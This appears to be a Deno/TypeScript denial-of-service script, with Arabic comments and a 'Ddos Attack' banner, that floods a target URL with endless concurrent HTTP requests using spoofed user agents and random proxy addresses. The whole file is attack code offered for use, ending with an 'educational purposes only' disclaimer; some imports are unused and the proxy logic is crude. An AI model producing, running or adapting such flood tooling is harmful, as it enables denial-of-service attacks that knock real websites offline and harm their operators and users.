import TelegramBot from "npm:node-telegram-bot-api";
import express from "npm:express";
import { HttpsProxyAgent } from "npm:https-proxy-agent";
import userAgents from "npm:user-agents";
import figlet from "npm:figlet";

// Colors
const F = '\x1b[1;32m';
const Z = '\x1b[1;31m';
const S = '\x1b[1;33m';
const B = '\x1b[38;5;208m';

console.log(`${F}[✓] All libraries installed and ready to use!${Z}`);

// عرض الشعار
const logo = figlet.textSync('Ddos Attack', { font: 'Slant' });
console.log(logo);

// دالة لتنفيذ الأوامر (بديل لـ execSync)
async function runCommand(cmd: string[]): Promise<void> {
  const process = Deno.run({
    cmd,
    stdout: "piped",
    stderr: "piped"
  });
  
  await process.status();
  process.close();
}

async function linked() {
  const sg = '2';
  if (sg === '1') {
    for (let i = 0; i < 50; i++) { // تقليل العدد للاختبار
      AttackMahos();
    }
  } else if (sg === '2') {
    for (let i = 0; i < 50; i++) { // تقليل العدد للاختبار
      ProxyAttack();
    }
  }
}

async function AttackMahos() {
  while (true) {
    const headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': new userAgents().toString()
    };
    
    try {
      const req = await fetch(url, { headers });
      if (req.status === 200) {
        console.log(`${F}GOOD Attack: ${url}`);
      } else {
        console.log(`${Z}BAD Attack: ${url}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url}`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 100)); // إضافة تأخير
  }
}

async function ProxyAttack() {
  while (true) {
    const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
    const pl = [80, 443, 8080]; // تقليل المنافذ للاختبار
    const port = pl[Math.floor(Math.random() * pl.length)];
    const proxy = `${ip}:${port}`;
    
    const headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': new userAgents().toString()
    };
    
    try {
      const agent = new HttpsProxyAgent(`http://${proxy}`);
      const req = await fetch(url, { 
        headers, 
        agent 
      } as RequestInit);
      
      if (req.status === 200) {
        console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
      } else {
        console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url} | ${proxy}`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 100)); // إضافة تأخير
  }
}

const url = 'https://example.com'; // تغيير الرابط لأغراض الاختبار

// تشغيل الهجوم
linked();

// ملاحظة: هذا الكود لأغراض تعليمية فقط
